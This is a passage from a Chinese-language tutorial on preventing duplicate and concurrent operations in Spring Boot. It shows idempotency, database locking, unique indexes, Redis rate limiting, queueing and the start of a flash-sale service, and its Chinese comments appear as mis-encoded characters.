<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Idempotent {
    <span class="hljs-comment">/**
     * å¹‚ç­‰æ€§keyçš„ç”Ÿæˆç­–ç•¥
     */</span>
    String <span class="hljs-title function_">keyGenerator</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">"default"</span>;
    
    <span class="hljs-comment">/**
     * è¿‡æœŸæ—¶é—´ï¼ˆç§’ï¼‰
     */</span>
    <span class="hljs-type">int</span> <span class="hljs-title function_">expireSeconds</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">300</span>;
}

<span class="hljs-comment">/**
 * å¹‚ç­‰æ€§åˆ‡é¢
 */</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdempotentAspect</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-meta">@Around("@annotation(idempotent)")</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint joinPoint, Idempotent idempotent)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// ç”Ÿæˆå¹‚ç­‰æ€§key</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">idempotentKey</span> <span class="hljs-operator">=</span> generateKey(joinPoint, idempotent);
        <span class="hljs-type">String</span> <span class="hljs-variable">redisKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"idempotent:"</span> + idempotentKey;
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²æ‰§è¡Œ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(redisKey);
        <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(result)) {
            <span class="hljs-comment">// å·²æ‰§è¡Œï¼Œè¿”å›ç¼“å­˜ç»“æœ</span>
            <span class="hljs-keyword">return</span> JSON.parseObject(result, getReturnType(joinPoint));
        }
        
        <span class="hljs-comment">// æ‰§è¡Œæ–¹æ³•</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> joinPoint.proceed();
        
        <span class="hljs-comment">// ç¼“å­˜ç»“æœ</span>
        redisTemplate.opsForValue().set(
            redisKey, 
            JSON.toJSONString(returnValue), 
            idempotent.expireSeconds(), 
            TimeUnit.SECONDS
        );
        
        <span class="hljs-keyword">return</span> returnValue;
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-meta">@Idempotent(keyGenerator = "orderNo", expireSeconds = 600)</span>
<span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">createOrder</span><span class="hljs-params">(CreateOrderParam param)</span> {
    <span class="hljs-comment">// åˆ›å»ºè®¢å•é€»è¾‘</span>
}
</code></pre>
<h4 data-id="heading-24">4.2 æ•°æ®åº“å±‚é˜²å¹¶å‘</h4>
<h5 data-id="heading-25">4.2.1 æ‚²è§‚é”ï¼ˆSELECT FOR UPDATEï¼‰</h5>
<p><strong>MyBatiså®ç°ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- OrderMapper.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectByIdForUpdate"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"OrderPO"</span>&gt;</span>
    SELECT * FROM t_order 
    WHERE id = #{id} 
    FOR UPDATE
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateStock"</span>&gt;</span>
    UPDATE t_product 
    SET stock = stock - #{quantity}
    WHERE id = #{productId} 
    AND stock &gt;= #{quantity}
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
</code></pre>
<p><strong>Serviceå±‚ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨æ‚²è§‚é”æ‰£å‡åº“å­˜
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨SELECT FOR UPDATEä¿è¯æ•°æ®ä¸€è‡´æ€§
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x + MyBatis
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductMapper productMapper;
    
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">deductStock</span><span class="hljs-params">(Long productId, Integer quantity)</span> {
        <span class="hljs-comment">// 1. ä½¿ç”¨æ‚²è§‚é”æŸ¥è¯¢å•†å“</span>
        <span class="hljs-type">ProductPO</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productMapper.selectByIdForUpdate(productId);
        <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.DATA_NOT_FOUND.code(), <span class="hljs-string">"å•†å“ä¸å­˜åœ¨"</span>);
        }
        
        <span class="hljs-comment">// 2. æ£€æŸ¥åº“å­˜</span>
        <span class="hljs-keyword">if</span> (product.getStock() &lt; quantity) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), <span class="hljs-string">"åº“å­˜ä¸è¶³"</span>);
        }
        
        <span class="hljs-comment">// 3. æ‰£å‡åº“å­˜</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">updateCount</span> <span class="hljs-operator">=</span> productMapper.updateStock(productId, quantity);
        <span class="hljs-keyword">if</span> (updateCount == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), <span class="hljs-string">"åº“å­˜æ‰£å‡å¤±è´¥"</span>);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h5 data-id="heading-26">4.2.2 ä¹è§‚é”ï¼ˆç‰ˆæœ¬å·æ§åˆ¶ï¼‰</h5>
<p><strong>æ•°æ®åº“è¡¨è®¾è®¡ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> t_order (
    id <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">UNIQUE</span>,
    user_id <span class="hljs-type">BIGINT</span>,
    amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>),
    status <span class="hljs-type">INT</span>,
    version <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>,  <span class="hljs-comment">-- ç‰ˆæœ¬å·å­—æ®µ</span>
    create_time DATETIME,
    update_time DATETIME
);
</code></pre>
<p><strong>MyBatiså®ç°ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- OrderMapper.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateWithVersion"</span>&gt;</span>
    UPDATE t_order 
    SET 
        status = #{status},
        version = version + 1,
        update_time = NOW()
    WHERE id = #{id} 
    AND version = #{version}
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
</code></pre>
<p><strong>Serviceå±‚ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨ä¹è§‚é”æ›´æ–°è®¢å•çŠ¶æ€
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨ç‰ˆæœ¬å·æ§åˆ¶ï¼Œå¤±è´¥æ—¶é‡è¯•
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-comment">/**
     * æ›´æ–°è®¢å•çŠ¶æ€ï¼ˆä¹è§‚é”ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">updateOrderStatus</span><span class="hljs-params">(Long orderId, Integer newStatus)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">maxRetries</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">while</span> (retryCount &lt; maxRetries) {
            <span class="hljs-comment">// 1. æŸ¥è¯¢è®¢å•ï¼ˆå¸¦ç‰ˆæœ¬å·ï¼‰</span>
            <span class="hljs-type">OrderPO</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
            <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.DATA_NOT_FOUND.code(), <span class="hljs-string">"è®¢å•ä¸å­˜åœ¨"</span>);
            }
            
            <span class="hljs-comment">// 2. ä½¿ç”¨ä¹è§‚é”æ›´æ–°</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">updateCount</span> <span class="hljs-operator">=</span> orderMapper.updateWithVersion(
                orderId, 
                newStatus, 
                order.getVersion()
            );
            
            <span class="hljs-keyword">if</span> (updateCount &gt; <span class="hljs-number">0</span>) {
                log.info(<span class="hljs-string">"è®¢å•çŠ¶æ€æ›´æ–°æˆåŠŸï¼šorderId={}, newStatus={}"</span>, orderId, newStatus);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            
            <span class="hljs-comment">// 3. æ›´æ–°å¤±è´¥ï¼Œç‰ˆæœ¬å†²çªï¼Œé‡è¯•</span>
            retryCount++;
            log.warn(<span class="hljs-string">"è®¢å•çŠ¶æ€æ›´æ–°å¤±è´¥ï¼ˆç‰ˆæœ¬å†²çªï¼‰ï¼Œé‡è¯•ï¼šorderId={}, retryCount={}"</span>, 
                orderId, retryCount);
            
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç­‰å¾…100msåé‡è¯•</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">break</span>;
            }
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
            <span class="hljs-string">"è®¢å•çŠ¶æ€æ›´æ–°å¤±è´¥ï¼Œè¯·é‡è¯•"</span>);
    }
}
</code></pre>
<h5 data-id="heading-27">4.2.3 å”¯ä¸€ç´¢å¼•é˜²é‡å¤</h5>
<p><strong>æ•°æ®åº“è®¾è®¡ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- é˜²æ­¢é‡å¤è®¢å•</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX uk_order_user_product <span class="hljs-keyword">ON</span> t_order(user_id, product_id, status);

<span class="hljs-comment">-- é˜²æ­¢é‡å¤æ”¯ä»˜</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX uk_payment_order <span class="hljs-keyword">ON</span> t_payment(order_id, status);
</code></pre>
<p><strong>Serviceå±‚å¤„ç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨å”¯ä¸€ç´¢å¼•é˜²æ­¢é‡å¤æ•°æ®
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šæ•°æ®åº“å”¯ä¸€ç´¢å¼• + å¼‚å¸¸å¤„ç†
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">createOrder</span><span class="hljs-params">(CreateOrderParam param)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">OrderPO</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPO</span>();
            order.setUserId(param.getUserId());
            order.setProductId(param.getProductId());
            order.setStatus(OrderStatusEnum.PENDING.getCode());
            orderMapper.insert(order);
            <span class="hljs-keyword">return</span> order.getId();
            
        } <span class="hljs-keyword">catch</span> (DuplicateKeyException e) {
            <span class="hljs-comment">// å”¯ä¸€ç´¢å¼•å†²çªï¼Œè¯´æ˜è®¢å•å·²å­˜åœ¨</span>
            log.warn(<span class="hljs-string">"è®¢å•å·²å­˜åœ¨ï¼šuserId={}, productId={}"</span>, 
                param.getUserId(), param.getProductId());
            
            <span class="hljs-comment">// æŸ¥è¯¢å·²å­˜åœ¨çš„è®¢å•</span>
            <span class="hljs-type">OrderPO</span> <span class="hljs-variable">existingOrder</span> <span class="hljs-operator">=</span> orderMapper.selectByUserIdAndProductId(
                param.getUserId(), 
                param.getProductId()
            );
            
            <span class="hljs-keyword">if</span> (existingOrder != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> existingOrder.getId();
            }
            
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.RECORD_EXISTED.code(), 
                <span class="hljs-string">"è®¢å•å·²å­˜åœ¨"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-28">4.3 é™æµæ–¹æ¡ˆ</h4>
<h5 data-id="heading-29">4.3.1 åŸºäºRedisçš„é™æµ</h5>
<p><strong>ä»¤ç‰Œæ¡¶ç®—æ³•å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.Collections;

<span class="hljs-comment">/**
 * Redisé™æµå·¥å…·ç±»ï¼ˆä»¤ç‰Œæ¡¶ç®—æ³•ï¼‰
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨Luaè„šæœ¬ä¿è¯åŸå­æ€§
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RateLimiterUtil</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOKEN_BUCKET_SCRIPT</span> <span class="hljs-operator">=</span> 
        <span class="hljs-string">"local key = KEYS[1] "</span> +
        <span class="hljs-string">"local capacity = tonumber(ARGV[1]) "</span> +
        <span class="hljs-string">"local tokens = tonumber(ARGV[2]) "</span> +
        <span class="hljs-string">"local interval = tonumber(ARGV[3]) "</span> +
        <span class="hljs-string">"local now = tonumber(ARGV[4]) "</span> +
        <span class="hljs-string">" "</span> +
        <span class="hljs-string">"local bucket = redis.call('HMGET', key, 'tokens', 'lastRefill') "</span> +
        <span class="hljs-string">"local currentTokens = tonumber(bucket[1]) or capacity "</span> +
        <span class="hljs-string">"local lastRefill = tonumber(bucket[2]) or now "</span> +
        <span class="hljs-string">" "</span> +
        <span class="hljs-string">"local elapsed = now - lastRefill "</span> +
        <span class="hljs-string">"local tokensToAdd = math.floor(elapsed / interval) "</span> +
        <span class="hljs-string">"currentTokens = math.min(capacity, currentTokens + tokensToAdd) "</span> +
        <span class="hljs-string">" "</span> +
        <span class="hljs-string">"if currentTokens &gt;= tokens then "</span> +
        <span class="hljs-string">"    currentTokens = currentTokens - tokens "</span> +
        <span class="hljs-string">"    redis.call('HMSET', key, 'tokens', currentTokens, 'lastRefill', now) "</span> +
        <span class="hljs-string">"    redis.call('EXPIRE', key, 3600) "</span> +
        <span class="hljs-string">"    return 1 "</span> +
        <span class="hljs-string">"else "</span> +
        <span class="hljs-string">"    redis.call('HMSET', key, 'tokens', currentTokens, 'lastRefill', now) "</span> +
        <span class="hljs-string">"    redis.call('EXPIRE', key, 3600) "</span> +
        <span class="hljs-string">"    return 0 "</span> +
        <span class="hljs-string">"end"</span>;
    
    <span class="hljs-comment">/**
     * é™æµæ£€æŸ¥ï¼ˆä»¤ç‰Œæ¡¶ç®—æ³•ï¼‰
     * <span class="hljs-doctag">@param</span> key é™æµkey
     * <span class="hljs-doctag">@param</span> capacity æ¡¶å®¹é‡
     * <span class="hljs-doctag">@param</span> tokens éœ€è¦çš„ä»¤ç‰Œæ•°
     * <span class="hljs-doctag">@param</span> interval ä»¤ç‰Œç”Ÿæˆé—´éš”ï¼ˆæ¯«ç§’ï¼‰
     * <span class="hljs-doctag">@return</span> æ˜¯å¦å…è®¸é€šè¿‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(String key, <span class="hljs-type">int</span> capacity, <span class="hljs-type">int</span> tokens, <span class="hljs-type">long</span> interval)</span> {
        DefaultRedisScript&lt;Long&gt; script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();
        script.setScriptText(TOKEN_BUCKET_SCRIPT);
        script.setResultType(Long.class);
        
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">Long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisTemplate.execute(
            script,
            Collections.singletonList(key),
            String.valueOf(capacity),
            String.valueOf(tokens),
            String.valueOf(interval),
            String.valueOf(now)
        );
        
        <span class="hljs-keyword">return</span> result != <span class="hljs-literal">null</span> &amp;&amp; result == <span class="hljs-number">1</span>;
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é™æµä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RateLimiterUtil rateLimiterUtil;
    
    <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">createOrder</span><span class="hljs-params">(CreateOrderParam param)</span> {
        <span class="hljs-comment">// é™æµï¼šæ¯ä¸ªç”¨æˆ·æ¯ç§’æœ€å¤šåˆ›å»º1ä¸ªè®¢å•</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">limitKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"rate:limit:order:create:"</span> + param.getUserId();
        <span class="hljs-keyword">if</span> (!rateLimiterUtil.tryAcquire(limitKey, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•"</span>);
        }
        
        <span class="hljs-comment">// åˆ›å»ºè®¢å•é€»è¾‘</span>
        <span class="hljs-keyword">return</span> doCreateOrder(param);
    }
}
</code></pre>
<h5 data-id="heading-30">4.3.2 æ»‘åŠ¨çª—å£é™æµ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ»‘åŠ¨çª—å£é™æµ
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowRateLimiter</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-comment">/**
     * æ»‘åŠ¨çª—å£é™æµ
     * <span class="hljs-doctag">@param</span> key é™æµkey
     * <span class="hljs-doctag">@param</span> windowSize çª—å£å¤§å°ï¼ˆç§’ï¼‰
     * <span class="hljs-doctag">@param</span> maxRequests æœ€å¤§è¯·æ±‚æ•°
     * <span class="hljs-doctag">@return</span> æ˜¯å¦å…è®¸é€šè¿‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(String key, <span class="hljs-type">int</span> windowSize, <span class="hljs-type">int</span> maxRequests)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">windowStart</span> <span class="hljs-operator">=</span> now - windowSize * <span class="hljs-number">1000</span>;
        
        <span class="hljs-comment">// ä½¿ç”¨ZSetå­˜å‚¨è¯·æ±‚æ—¶é—´æˆ³</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">zsetKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"rate:limit:sliding:"</span> + key;
        
        <span class="hljs-comment">// ç§»é™¤çª—å£å¤–çš„æ•°æ®</span>
        redisTemplate.opsForZSet().removeRangeByScore(zsetKey, <span class="hljs-number">0</span>, windowStart);
        
        <span class="hljs-comment">// è·å–å½“å‰çª—å£å†…çš„è¯·æ±‚æ•°</span>
        <span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> redisTemplate.opsForZSet().count(zsetKey, windowStart, now);
        
        <span class="hljs-keyword">if</span> (count != <span class="hljs-literal">null</span> &amp;&amp; count &gt;= maxRequests) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-comment">// æ·»åŠ å½“å‰è¯·æ±‚</span>
        redisTemplate.opsForZSet().add(zsetKey, String.valueOf(now), now);
        redisTemplate.expire(zsetKey, windowSize + <span class="hljs-number">1</span>, TimeUnit.SECONDS);
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h4 data-id="heading-31">4.4 é˜Ÿåˆ—å‰Šå³°æ–¹æ¡ˆ</h4>
<h5 data-id="heading-32">4.4.1 å¼‚æ­¥é˜Ÿåˆ—å¤„ç†</h5>
<p><strong>ä½¿ç”¨çº¿ç¨‹æ±  + é˜Ÿåˆ—ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.concurrent.BlockingQueue;
<span class="hljs-keyword">import</span> java.util.concurrent.LinkedBlockingQueue;

<span class="hljs-comment">/**
 * è®¢å•é˜Ÿåˆ—å¤„ç†
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨é˜Ÿåˆ—å‰Šå³°ï¼Œé˜²æ­¢ç³»ç»Ÿè¿‡è½½
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueueProcessor</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ThreadPoolTaskExecutor orderExecutor;
    
    <span class="hljs-comment">// è®¢å•é˜Ÿåˆ—</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> BlockingQueue&lt;CreateOrderParam&gt; orderQueue = 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10000</span>);
    
    <span class="hljs-comment">/**
     * æäº¤è®¢å•åˆ°é˜Ÿåˆ—
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitOrder</span><span class="hljs-params">(CreateOrderParam param)</span> {
        <span class="hljs-keyword">if</span> (!orderQueue.offer(param)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨åå†è¯•"</span>);
        }
        
        <span class="hljs-comment">// å¼‚æ­¥å¤„ç†</span>
        orderExecutor.execute(() -&gt; processOrderQueue());
    }
    
    <span class="hljs-comment">/**
     * å¤„ç†è®¢å•é˜Ÿåˆ—
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processOrderQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">while</span> (!orderQueue.isEmpty()) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">CreateOrderParam</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> orderQueue.poll();
                <span class="hljs-keyword">if</span> (param != <span class="hljs-literal">null</span>) {
                    orderService.createOrder(param);
                }
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"è®¢å•å¤„ç†å¤±è´¥"</span>, e);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-33">äº”ã€Cç«¯/Bç«¯å…¸å‹åœºæ™¯å®æˆ˜</h3>
<h4 data-id="heading-34">5.1 Cç«¯åœºæ™¯ï¼šç§’æ€æŠ¢è´­</h4>
<p><strong>å®Œæ•´æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç§’æ€æœåŠ¡
 * ã€åœºæ™¯è¯†åˆ«ã€‘ï¼šé«˜å¹¶å‘ç§’æ€åœºæ™¯
 * ã€é˜²å¹¶å‘ç­–ç•¥ã€‘ï¼šé™æµ + åˆ†å¸ƒå¼é” + æ•°æ®åº“ä¹è§‚é” + é˜Ÿåˆ—å‰Šå³°
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RateLimiterUtil rateLimiterUtil;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DistributedLockUtil distributedLockUtil;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductMapper productMapper;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-comment">/**
     * ç§’æ€ä¸‹å•
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> SeckillResult <span class="hljs-title function_">seckill</span><span class="hljs-params">(Long userId, Long productId)</span> {
        <span class="hljs-comment">// 1. é™æµï¼šæ¯ä¸ªç”¨æˆ·æ¯ç§’æœ€å¤š1æ¬¡è¯·æ±‚</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">limitKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:limit:"</span> + userId;
        <span class="hljs-keyword">if</span> (!rateLimiterUtil.tryAcquire(limitKey, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)) {
            <span class="hljs-keyword">return</span> SeckillResult.fail(<span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•"</span>);
        }
        
        <span class="hljs-comment">// 2. åˆ†å¸ƒå¼é”ï¼šé˜²æ­¢åŒä¸€ç”¨æˆ·é‡å¤ä¸‹å•</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:lock:"</span> + userId + <span class="hljs-string">":"</span> + productId;
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
